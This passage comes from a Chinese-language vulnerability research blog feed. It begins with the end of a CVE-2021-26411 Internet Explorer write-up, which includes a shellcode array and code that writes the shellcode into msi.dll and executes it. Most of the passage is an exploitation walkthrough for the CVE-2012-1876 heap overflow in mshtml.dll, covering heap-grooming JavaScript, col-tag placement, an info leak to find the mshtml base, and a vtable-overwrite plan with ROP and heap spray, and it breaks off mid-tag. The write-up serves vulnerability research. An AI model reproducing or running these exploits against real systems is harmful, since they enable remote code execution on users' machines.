&#125;<br></code></pre></td></tr></table></figure><p>执行shellcode</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript">          <span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([ <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x0C</span>,<br><span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x53</span>,<br><span class="hljs-number">0x68</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8B</span>,<br><span class="hljs-number">0x49</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x75</span>,<br><span class="hljs-number">0x05</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xCD</span>,<br><span class="hljs-number">0x8B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xBE</span>,<br><span class="hljs-number">0x06</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>,<br><span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x03</span>,<br><span class="hljs-number">0xDD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xA9</span>,<br><span class="hljs-number">0x33</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x53</span>,<br><span class="hljs-number">0x50</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0B</span>,<br><span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>,<br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>,<br><span class="hljs-number">0xDE</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xEC</span>,<br><span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xCA</span>,<br><span class="hljs-number">0x02</span> ])<br>    <span class="hljs-keyword">var</span> msi = <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">LoadLibraryExA</span>, [<span class="hljs-title function_">newStr</span>(<span class="hljs-string">&#x27;msi.dll&#x27;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]) + <span class="hljs-number">0x5000</span><br>    <span class="hljs-keyword">var</span> tmpBuffer = <span class="hljs-title function_">createArrayBuffer</span>(<span class="hljs-number">4</span>)<br>    <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">VirtualProtect</span>, [msi, shellcode.<span class="hljs-property">length</span>, <span class="hljs-number">0x4</span>, tmpBuffer])<br>    <span class="hljs-title function_">writeData</span>(msi, shellcode) <span class="hljs-comment">// mov eax, 0x1337 ; ret</span><br>    <span class="hljs-title function_">call2</span>(<span class="hljs-title class_">VirtualProtect</span>, [msi, shellcode.<span class="hljs-property">length</span>, <span class="hljs-title function_">read</span>(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-title function_">call2</span>(msi, [])<br></code></pre></td></tr></table></figure><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220220163212880.png" alt="image-20220220163212880"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h3><p><a href="https://enki.co.kr/blog/2021/02/04/ie_0day.html">https://enki.co.kr/blog/2021/02/04/ie_0day.html</a></p><p><a href="https://ha.cker.in/index.php/Article/17190">https://ha.cker.in/index.php/Article/17190</a></p><p><a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html</a></p><p><a href="https://paper.seebug.org/1579/">https://paper.seebug.org/1579/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2012-1876 漏洞分析与利用</title>
    <link href="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>CVE-2012-1876 </p><p>mshtml.dll中函数CTableLayout::CalculateMinMax,通过span属性值作为循环次数向堆内存中写入数据时,未对span进行有效的校验而导致堆溢出,可实现RCE.</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>调试ie,开启子进程调试,开启页堆,定位堆溢出位置</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gflags<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">i</span> iexplore<span class="hljs-selector-class">.exe</span> +hpa<br><span class="hljs-selector-class">.childdbg</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>溢出点,edi的值导致了crash,edi&#x3D;[esi+18],向上追踪esi何处被赋值</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211229114237566-16408771195061.png" alt="image-20211229114237566"></p><p>查看堆栈,CalCulateMinMax存在大量对esi的操作,对CalCulateMinMax函数下断,进行分析</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211230113908818.png" alt="image-20211230113908818"></p><p>首次加载页面,会获取一些属性,第一个参数为Table标签的类对象</p><p>ebx&#x3D;CTableLayout</p><p>ebx+0x54&#x3D;&#x3D; 所有col标签span属性值的和,标记为spannum</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207230614071.png" alt="image-20211207230614071"></p><p>如果通过判断:(this+0x94&gt;&gt;2) &lt; spannum,则通过函数EnsureSizeWorker申请空间<img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207232636863.png" alt="image-20211207232636863"></p><p>函数EnsureSizeWorker内部会进行判断,确保最小申请空间为0x1C*4&#x3D;0x70字节空间,并将地址存储入this+0x9C处</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207232431207.png" alt="image-20211207232431207"></p><p>执行完之后会对this+0x94进行更新</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207232551022.png" alt="image-20211207232551022"></p><p>通过调用函数over_trigger修改标签属性,第二次运行CalculateMinMax</p><p>此时this+0x94更新后&#x3D;&#x3D;4,(4&gt;&gt;2)&#x3D;&#x3D;spannum,所以不会再进行申请内存的操作</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211207225629386.png" alt="image-20211207225629386"></p><p>此时GetAAspan返回值为0x3e8,说明span属性值已经成功被修改,但是CTableLayout成员变量并没有发生改变</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211208111707595.png" alt="image-20211208111707595"></p><p> spannum仍然为1</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211208111908997.png" alt="image-20211208111908997"></p><p>通过函数GetFancyFormat对修改后的width进行了一次运算(42765*100)&lt;&lt;4+9&#x3D;0x4141149</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211209112737753.png" alt="image-20211209112737753"></p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211209112405108.png" alt="image-20211209112405108"></p><p> 然后将参数传入,通过函数GetPixelWidth进行第二次运算,最终通过width得到的结果为0x519159</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211209113435023.png" alt="image-20211209113435023"></p><p>当运行到此处时,已经可以很明显的看出漏洞成因了,压入参数[ebp-0xc]也就是前面通过width计算出的值,通过函数AjdustForCol,循环1000次写入堆中,每次写入数据大小为0xC,而堆大小只有0x70,因为修改span后,没有重新分配相应大小的堆空间,最终会产生堆溢出.</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211209182233383.png" alt="image-20211209182233383"></p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>构造堆的布局,进行占位.让内存申请到释放的位置.</p><p>第一次溢出覆盖字符串长度,暴露mshtml基址.</p><p>第二次溢出覆盖虚表指针,构造rop,通过heapspray将shellcode喷射到覆盖的虚表指针地址,绕过DEP和ASLR保护,执行shellcode.</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>第一步申请内存空间,写入大量BSTR字符串,构造堆布局,释放存储字符”E”的堆空间,让EnsureSizeWorker申请内存时,可以占用释放的位置.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;div id=<span class="hljs-string">&quot;test&quot;</span>&gt;&lt;/div&gt;<br> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;javascript&#x27;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">     d = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;test&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> dap = <span class="hljs-string">&quot;EEEE&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">while</span> (dap.<span class="hljs-property">length</span> &lt; <span class="hljs-number">0x200</span>) dap += dap;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> padding = <span class="hljs-string">&quot;AAAA&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">while</span> (padding.<span class="hljs-property">length</span> &lt; <span class="hljs-number">0x200</span>) padding += padding;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> filler = <span class="hljs-string">&quot;BBBB&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">while</span> (filler.<span class="hljs-property">length</span> &lt; <span class="hljs-number">0x200</span>) filler += filler;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">var</span> rra = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-comment">//EEEE AAAA BBBB OOOO</span></span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i += <span class="hljs-number">2</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">         rra[i] = dap.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);</span></span><br><span class="language-javascript"><span class="language-xml">         arr[i] = padding.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);</span></span><br><span class="language-javascript"><span class="language-xml">         arr[i + <span class="hljs-number">1</span>] = filler.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>);</span></span><br><span class="language-javascript"><span class="language-xml">         <span class="hljs-keyword">var</span> obj = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;button&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">         d.<span class="hljs-title function_">appendChild</span>(obj);</span></span><br><span class="language-javascript"><span class="language-xml">     &#125;</span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-comment">//theap A B button</span></span></span><br><span class="language-javascript"><span class="language-xml">     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">200</span>; i &lt; <span class="hljs-number">1000</span>; i += <span class="hljs-number">2</span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">         rra[i] = <span class="hljs-literal">null</span>;</span></span><br><span class="language-javascript"><span class="language-xml">         <span class="hljs-title class_">CollectGarbage</span>();</span></span><br><span class="language-javascript"><span class="language-xml">     &#125;</span></span><br><span class="language-javascript"><span class="language-xml"> </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>构造col标签,进行占位</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;table style=<span class="hljs-string">&quot;table-layout:fixed&quot;</span>&gt;<br>          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;41&quot;</span> <span class="hljs-attr">span</span>=<span class="hljs-string">&quot;9&quot;</span>&gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span></span><br>&lt;/table&gt;<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;table-layout:fixed&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;41&quot;</span> <span class="hljs-attr">span</span>=<span class="hljs-string">&quot;9&quot;</span>&gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br>...<br>&lt;table style=<span class="hljs-string">&quot;table-layout:fixed&quot;</span>&gt;<br>          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">col</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;132&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;41&quot;</span> <span class="hljs-attr">span</span>=<span class="hljs-string">&quot;9&quot;</span>&gt;</span>&amp;nbsp <span class="hljs-tag">&lt;/<span class="hljs-name">col</span>&gt;</span></span><br>&lt;/table&gt;<br></code></pre></td></tr></table></figure><p>通过windbg调试,输出日志,判断是否成功占位</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">sxe ld:jscript<br>bu ntdll<span class="hljs-title">!RtlFreeHeap</span> <span class="hljs-string">&quot;.echo free heap;db poi(esp+c) l10;g&quot;</span><br>bu mshtml<span class="hljs-title">!CTableLayout</span>::CalculateMinMax<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span>C <span class="hljs-string">&quot;.echo vulheap;dd poi(ebx+9c) l4;g&quot;</span><br>.logopen <span class="hljs-keyword">c</span>:\log.txt<br></code></pre></td></tr></table></figure><p>程序成功申请到前面释放的内存,这里要去除页堆,不然成功率很低.</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211210181648025.png" alt="image-20211210181648025"></p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211214114306662.png" alt="image-20211214114306662"></p><p>当前内存布局,可以找到CButton虚表指针,需要通过它计算出mshtml基址,因为CButtonLayout虚表指针和mshtml基址的偏移是固定的,为了能够读取到这个值,需要通过溢出改变字符串B的长度,读取CButtonLayout虚表指针</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211214122355831.png" alt="image-20211214122355831"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">one_overflow</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-comment">//首次溢出,通过CButtonLayout暴露mshtml基址</span><br>          <span class="hljs-keyword">var</span> col = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-number">2</span>);<br>          col.<span class="hljs-property">span</span> = <span class="hljs-number">19</span>;<br>      &#125;<br><br>      <span class="hljs-keyword">function</span> <span class="hljs-title function_">get_mshtml_base</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-keyword">var</span> leak_addr = -<span class="hljs-number">1</span>;<br>          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>              <span class="hljs-keyword">if</span> (arr[i].<span class="hljs-property">length</span> &gt; (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span>) &#123;<br>                  leak_index = i;<br>                  <span class="hljs-keyword">var</span> leak = arr[i].<span class="hljs-title function_">substring</span>((<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span> + (<span class="hljs-number">2</span> + <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>, (<span class="hljs-number">0x100</span> - <span class="hljs-number">6</span>) / <span class="hljs-number">2</span> + (<span class="hljs-number">2</span> + <span class="hljs-number">8</span>) + <span class="hljs-number">4</span> / <span class="hljs-number">2</span>);<br>                  leak_addr = <span class="hljs-built_in">parseInt</span>(leak.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>) + leak.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>);<br>                  <span class="hljs-comment">//alert(&quot;CButtonLayout VirtualTable Point:0x&quot; + leak_addr.toString(16));</span><br>                  mshtml_base = leak_addr - <span class="hljs-title class_">Number</span>(<span class="hljs-number">0x001584f8</span>);<br>                  <span class="hljs-comment">//alert(&quot;mshtml base:0x&quot; + mshtml_base.toString(16));</span><br>                  <span class="hljs-title function_">heapspray</span>(mshtml_base);<br>                  <span class="hljs-keyword">break</span>;<br>              &#125;<br>          &#125;<br>      &#125;<br></code></pre></td></tr></table></figure><p>第一次溢出,长度成功被覆盖</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211216213054096.png" alt="image-20211216213054096"></p><p>通过暴露的虚表指针信息,可以找到mshtml.dll基址,偏移为:0x1584F8</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211214162949356.png" alt="image-20211214162949356"></p><p> 获取偏移后,再使用windbg调试,验证基址是否正确.</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211214164159962.png" alt="image-20211214164159962"> </p><p>第二次溢出覆盖CButtonLayout对象的虚表指针进行覆盖,控制程序执行流程</p><p> <img 